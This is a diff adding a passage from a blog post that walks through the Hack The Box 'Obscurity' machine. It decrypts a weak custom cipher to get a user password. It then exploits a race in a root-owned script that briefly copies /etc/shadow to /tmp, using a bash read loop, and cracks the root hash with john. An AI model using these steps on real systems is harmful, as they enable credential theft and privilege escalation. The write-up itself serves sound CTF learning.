+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">i</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'UTF-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+        <span class="k">print</span><span class="p">(</span><span class="s">"Decrypting..."</span><span class="p">)</span>
+        <span class="n">decrypted</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">k</span><span class="p">)</span>
+
+        <span class="k">print</span><span class="p">(</span><span class="s">"Writing to {0}..."</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">o</span><span class="p">))</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">o</span><span class="p">,</span> <span class="s">'w'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'UTF-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Opening file {0}..."</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">i</span><span class="p">))</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">i</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'UTF-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+        <span class="k">print</span><span class="p">(</span><span class="s">"Encrypting..."</span><span class="p">)</span>
+        <span class="n">encrypted</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">k</span><span class="p">)</span>
+
+        <span class="k">print</span><span class="p">(</span><span class="s">"Writing to {0}..."</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">o</span><span class="p">))</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">o</span><span class="p">,</span> <span class="s">'w'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'UTF-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span></code></pre></figure>
+
+<p>After looking at the code It’s just a simple ceaser cipher with a text key instead of a number.</p>
+
+<p>The second file <code class="highlighter-rouge">check.txt</code> it’s a message that says:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">Encrypting this file with your key should result in out.txt, make sure your key is correct! </span></code></pre></figure>
+
+<p>The file <code class="highlighter-rouge">out.txt</code> is the encryption of <code class="highlighter-rouge">check.txt</code>, so simply we can retrieve the key be decoding the encrypted data with the original text as a key. And after that, we can decrypt the <code class="highlighter-rouge">passreminder.txt</code> file to get the user password.</p>
+
+<p>I made a simple script to decrypt the file anf get the user password:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python3
+</span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'out.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'check.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">check</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'passreminder.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">enc</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">keylen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="n">keyPos</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">decrypted</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
+        <span class="n">keyChr</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">keyPos</span><span class="p">]</span>
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="n">newChr</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="n">keyChr</span><span class="p">))</span> <span class="o">%</span> <span class="mi">255</span><span class="p">)</span>
+        <span class="n">decrypted</span> <span class="o">+=</span> <span class="n">newChr</span>
+        <span class="n">keyPos</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">keyPos</span> <span class="o">=</span> <span class="n">keyPos</span> <span class="o">%</span> <span class="n">keylen</span>
+    <span class="k">return</span> <span class="n">decrypted</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">check</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'[+] Key:'</span><span class="p">,</span><span class="n">key</span><span class="p">)</span>
+<span class="n">password</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'[+] Password:'</span><span class="p">,</span><span class="n">password</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span></code></pre></figure>
+
+<p>After running the script we got some readable text and some garbage:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">y4mm1@kali:~$</span><span class="w"> </span>python3 crack.py 
+<span class="go">[+] Key: alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich&lt;
+[+] Password: SecThruObsFTW</span></code></pre></figure>
+
+<p>And now we owned user <code class="highlighter-rouge">robert</code>:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">www-data@obscure:/$</span><span class="w"> </span>su robert
+<span class="go">Password: SecThruObsFTW
+</span><span class="gp">robert@obscure:/$</span><span class="w"> </span><span class="nb">cat</span> ~/user.txt
+<span class="go">e4493782</span></code></pre></figure>
+
+<h3 id="2-own-root">2. Own Root</h3>
+<p>After we got user there is another interesting readable file <code class="highlighter-rouge">/home/robert/BetterSSH/BetterSSH.py</code> owned by root.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">random</span><span class="p">,</span> <span class="n">string</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">crypt</span>
+<span class="kn">import</span> <span class="nn">traceback</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="n">path</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">8</span><span class="p">))</span>
+<span class="n">session</span> <span class="o">=</span> <span class="p">{</span><span class="s">"user"</span><span class="p">:</span> <span class="s">""</span><span class="p">,</span> <span class="s">"authenticated"</span><span class="p">:</span> <span class="mi">0</span><span class="p">}</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">session</span><span class="p">[</span><span class="s">'user'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Enter username: "</span><span class="p">)</span>
+    <span class="n">passW</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Enter password: "</span><span class="p">)</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/etc/shadow'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">[(</span><span class="n">p</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span> <span class="k">if</span> <span class="s">"$"</span> <span class="ow">in</span> <span class="n">p</span> <span class="k">else</span> <span class="bp">None</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]</span>
+    <span class="n">passwords</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="n">passwords</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+
+    <span class="n">passwordFile</span> <span class="o">=</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">])</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/tmp/SSH/'</span><span class="o">+</span><span class="n">path</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">passwordFile</span><span class="p">)</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">.1</span><span class="p">)</span>
+    <span class="n">salt</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="n">realPass</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">session</span><span class="p">[</span><span class="s">'user'</span><span class="p">]:</span>
+            <span class="n">salt</span><span class="p">,</span> <span class="n">realPass</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'$'</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
+            <span class="k">break</span>
+
+    <span class="k">if</span> <span class="n">salt</span> <span class="o">==</span> <span class="s">""</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Invalid user"</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s">'/tmp/SSH/'</span><span class="o">+</span><span class="n">path</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">salt</span> <span class="o">=</span> <span class="s">'$6$'</span><span class="o">+</span><span class="n">salt</span><span class="o">+</span><span class="s">'$'</span>
+    <span class="n">realPass</span> <span class="o">=</span> <span class="n">salt</span> <span class="o">+</span> <span class="n">realPass</span>
+
+    <span class="nb">hash</span> <span class="o">=</span> <span class="n">crypt</span><span class="o">.</span><span class="n">crypt</span><span class="p">(</span><span class="n">passW</span><span class="p">,</span> <span class="n">salt</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="nb">hash</span> <span class="o">==</span> <span class="n">realPass</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Authed!"</span><span class="p">)</span>
+        <span class="n">session</span><span class="p">[</span><span class="s">'authenticated'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Incorrect pass"</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s">'/tmp/SSH/'</span><span class="o">+</span><span class="n">path</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">'/tmp/SSH/'</span><span class="p">,</span><span class="n">path</span><span class="p">))</span>
+<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="n">traceback</span><span class="o">.</span><span class="n">print_exc</span><span class="p">()</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="s">'authenticated'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">'user'</span><span class="p">]</span> <span class="o">+</span> <span class="s">"@Obscure$ "</span><span class="p">)</span>
+        <span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="s">'sudo'</span><span class="p">,</span> <span class="s">'-u'</span><span class="p">,</span>  <span class="n">session</span><span class="p">[</span><span class="s">'user'</span><span class="p">]]</span>
+        <span class="n">cmd</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">command</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">))</span>
+        <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+
+        <span class="n">o</span><span class="p">,</span><span class="n">e</span> <span class="o">=</span> <span class="n">proc</span><span class="o">.</span><span class="n">communicate</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'Output: '</span> <span class="o">+</span> <span class="n">o</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'Error: '</span>  <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">else</span> <span class="k">print</span><span class="p">(</span><span class="s">''</span><span class="p">)</span></code></pre></figure>
+
+<p>The above script just mimics the <strong>SSH</strong> connection with the actual system users by reading the username and compare the password with the actual one in the <code class="highlighter-rouge">/etc/shadow</code> file. If it’s true it gives a shell to the user, if it’s not it aborts.</p>
+
+<p>But, the deadly bug in the script is when it copies the contents of the <strong>shadow</strong> file into a random file in <code class="highlighter-rouge">/tmp/SSH</code> directory and sleep <code class="highlighter-rouge">0.1s</code>, then delete it. That’s so nice, we can take advantage of that by trying to read the contents of the random file before the deletion process and copy it into our machine.</p>
+
+<p>There are many ways to exploit this bug one of them is to use <code class="highlighter-rouge">watch</code> command, but I prefer to write some code, so let’s write some <code class="highlighter-rouge">bash</code> script to print the contents of the random file in the terminal.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">#</span><span class="o">!</span>/bin/bash
+<span class="go">DIR='/tmp/SSH'
+while :
+do
+</span><span class="gp">    if ls -A $</span>DIR/<span class="p">;</span> <span class="k">then</span>
+<span class="gp">        cat $</span>DIR/<span class="k">*</span>
+<span class="go">    fi
+done</span></code></pre></figure>
+
+<p><a href="/assets/documentation/hack-the-box/obscurity/root_hash-555463ced94b24b94ebae54bd927eef583c364b0166b2f4e435e8dc345cba8de.png">
+  <img src="/assets/documentation/hack-the-box/obscurity/root_hash-555463ced94b24b94ebae54bd927eef583c364b0166b2f4e435e8dc345cba8de.png" alt="Obscurity" class="zooming" data-rjs="/assets/documentation/hack-the-box/obscurity/root_hash-555463ced94b24b94ebae54bd927eef583c364b0166b2f4e435e8dc345cba8de.png" data-zooming-width="1118" data-zooming-height="1013" />
+</a></p>
+
+<p>And we got the root hash, let’s crack it with our friend <code class="highlighter-rouge">john</code>.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">y4mm1@kali:~$</span><span class="w"> </span>john root.hash 
+<span class="go">Created directory: /root/.john
+Using default input encoding: UTF-8
+</span><span class="gp">Loaded 1 password hash (sha512crypt, crypt(3) $</span>6<span class="nv">$ </span><span class="o">[</span>SHA512 128/128 XOP 2x]<span class="o">)</span>
+<span class="go">Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 3 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+mercedes         (root)
+1g 0:00:00:01 DONE 2/3 (2020-05-09 14:42) 0.6535g/s 962.0p/s 962.0c/s 962.0C/s crystal..porter
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed</span></code></pre></figure>
+
+<p>And we owned root:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">robert@obscure:~$</span><span class="w"> </span>su root
+<span class="go">Password: mercedes
+</span><span class="gp">root@obscure:/home/robert#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span><span class="gp">root@obscure:/home/robert#</span><span class="w"> </span><span class="nb">cat</span> ~/root.txt 
+<span class="go">512fd442</span></code></pre></figure>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Hack+The+Box+-+Obscurity%20-%20https://y4mm1.github.io/posts/obscurity" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://y4mm1.github.io/posts/obscurity" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://my-blog-0vgcdsd8x2.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+    <p style="text-align: center">
+      This is my little tech blog, feel free to ask me any question &#169;
+      <a href="/about" title="About me">Ahmed Sayed</a>
+    </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-157807027-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-157807027-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+</body>
+</html>
